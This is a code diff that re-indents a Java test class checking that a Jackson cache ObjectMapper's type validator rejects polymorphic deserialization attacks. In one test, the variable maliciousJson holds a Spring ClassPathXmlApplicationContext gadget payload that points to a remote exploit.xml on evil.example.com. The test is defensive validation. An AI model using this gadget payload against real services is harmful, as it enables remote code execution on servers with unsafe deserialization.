@@ -38,9 +38,9 @@ class CacheConfigObjectMapperTest {
     private ObjectMapper createCacheObjectMapper() {
         ObjectMapper mapper = new ObjectMapperConfig().objectMapper();
         mapper.activateDefaultTyping(
-                CachePolymorphicTypeValidatorFactory.createDefault(),
-                ObjectMapper.DefaultTyping.NON_FINAL,
-                JsonTypeInfo.As.PROPERTY
+            CachePolymorphicTypeValidatorFactory.createDefault(),
+            ObjectMapper.DefaultTyping.NON_FINAL,
+            JsonTypeInfo.As.PROPERTY
         );
         mapper.setVisibility(PropertyAccessor.GETTER, JsonAutoDetect.Visibility.NONE);
         mapper.setVisibility(PropertyAccessor.IS_GETTER, JsonAutoDetect.Visibility.NONE);
@@ -55,14 +55,14 @@ class CacheConfigObjectMapperTest {
 
     private Account createTestAccount() {
         return Account.from(
-                AccountSnapshotState.builder()
-                        .id(1L)
-                        .name("PG_RECEIVABLE")
-                        .accountType(AccountType.ASSET)
-                        .status(EntityStatus.ACTIVE)
-                        .createdAt(LocalDateTime.of(2026, 1, 1, 0, 0))
-                        .modifiedAt(LocalDateTime.of(2026, 1, 1, 0, 0))
-                        .build()
+            AccountSnapshotState.builder()
+                .id(1L)
+                .name("PG_RECEIVABLE")
+                .accountType(AccountType.ASSET)
+                .status(EntityStatus.ACTIVE)
+                .createdAt(LocalDateTime.of(2026, 1, 1, 0, 0))
+                .modifiedAt(LocalDateTime.of(2026, 1, 1, 0, 0))
+                .build()
         );
     }
 
@@ -134,7 +134,7 @@ class CacheConfigObjectMapperTest {
 
         // when & then
         assertThatThrownBy(() -> mapper.readValue(maliciousJson, Object.class))
-                .isInstanceOf(InvalidTypeIdException.class);
+            .isInstanceOf(InvalidTypeIdException.class);
     }
 
     @Test
@@ -146,7 +146,7 @@ class CacheConfigObjectMapperTest {
 
         // when & then
         assertThatThrownBy(() -> mapper.readValue(maliciousJson, Object.class))
-                .isInstanceOf(InvalidTypeIdException.class);
+            .isInstanceOf(InvalidTypeIdException.class);
     }
 
     @Test
@@ -155,10 +155,10 @@ class CacheConfigObjectMapperTest {
         // given
         ObjectMapper mapper = createCacheObjectMapper();
         String maliciousJson =
-                "[\"org.springframework.context.support.ClassPathXmlApplicationContext\",\"http://evil.example.com/exploit.xml\"]";
+            "[\"org.springframework.context.support.ClassPathXmlApplicationContext\",\"http://evil.example.com/exploit.xml\"]";
 
         // when & then
         assertThatThrownBy(() -> mapper.readValue(maliciousJson, Object.class))
-                .isInstanceOf(InvalidTypeIdException.class);
+            .isInstanceOf(InvalidTypeIdException.class);
     }
 }
